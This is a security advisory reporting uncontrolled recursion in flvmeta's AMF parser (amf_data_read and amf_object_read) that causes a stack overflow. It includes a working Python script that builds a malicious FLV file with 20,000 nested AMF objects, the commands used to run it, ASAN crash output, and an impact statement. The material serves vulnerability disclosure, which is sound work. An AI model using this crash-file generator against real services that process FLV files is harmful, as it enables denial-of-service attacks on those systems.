## Bug0: Uncontrolled Recursion in amf_data_read Causes Stack Overflow

In `amf_data_read()` and `amf_object_read()` (src/amf.c, invoked through the dump_raw.c metadata-parsing path), the mutual recursion that processes nested AMF objects and arrays enforces no depth limit, allowing a crafted FLV Script tag with arbitrarily deep nesting to exhaust the call stack and crash the process.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT = "poc_input.flv"
DEPTH = 20000

def build_nested_amf():
    data = b"\x00" + struct.pack(">d", 1.0)
    for _ in range(DEPTH):
        key = b"\x00\x01" + b"a"
        data = b"\x03" + key + data + b"\x00\x00\x09"
    return data

def build_flv():
    tag_name = b"\x02" + struct.pack(">H", 10) + b"onMetaData"
    amf_payload = build_nested_amf()
    script_data = tag_name + amf_payload

    data_size = len(script_data)
    tag_type = b"\x12"
    size_bytes = struct.pack(">I", data_size)[1:]
    timestamp = b"\x00\x00\x00"
    timestamp_extended = b"\x00"
    stream_id = b"\x00\x00\x00"

    tag = tag_type + size_bytes + timestamp + timestamp_extended + stream_id + script_data
    prev_tag_size = struct.pack(">I", len(tag))

    flv_header = b"FLV" + b"\x01" + b"\x05" + b"\x00\x00\x00\x09"
    initial_pts = b"\x00\x00\x00\x00"

    return flv_header + initial_pts + tag + prev_tag_size

def main():
    print(f"[*] Building {DEPTH}-level nested AMF object...")
    flv_bytes = build_flv()
    with open(OUTPUT, "wb") as f:
        f.write(flv_bytes)
    print(f"[*] Written {len(flv_bytes)} bytes to {OUTPUT}")

if __name__ == "__main__":
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==ERROR: AddressSanitizer: stack-overflow on address 0x7ffc848efff8 (pc 0x7f2c91fe0660 bp 0x7f2c92170780 sp 0x7ffc848f0000 T0)
    #0 0x7f2c91fe0660 in _IO_new_file_xsputn libio/fileops.c:1235
    #6 0x55f8a62763e8 in xml_amf_data_dump (flvmeta+0xdd3e8)
    #7 0x55f8a6276896 in xml_amf_data_dump (flvmeta+0xdd896)

### Impact

A remote attacker can supply a crafted FLV file containing deeply nested AMF objects in its Script tag to exhaust the process call stack of flvmeta, producing an unconditional denial of service. Any application or automated pipeline that passes user-controlled FLV files to flvmeta is exposed because the crash occurs along the default metadata-dump code path with no special command-line options required. On builds compiled without stack canaries, sufficiently aligned deep nesting could potentially corrupt saved return addresses and lead to arbitrary code execution.
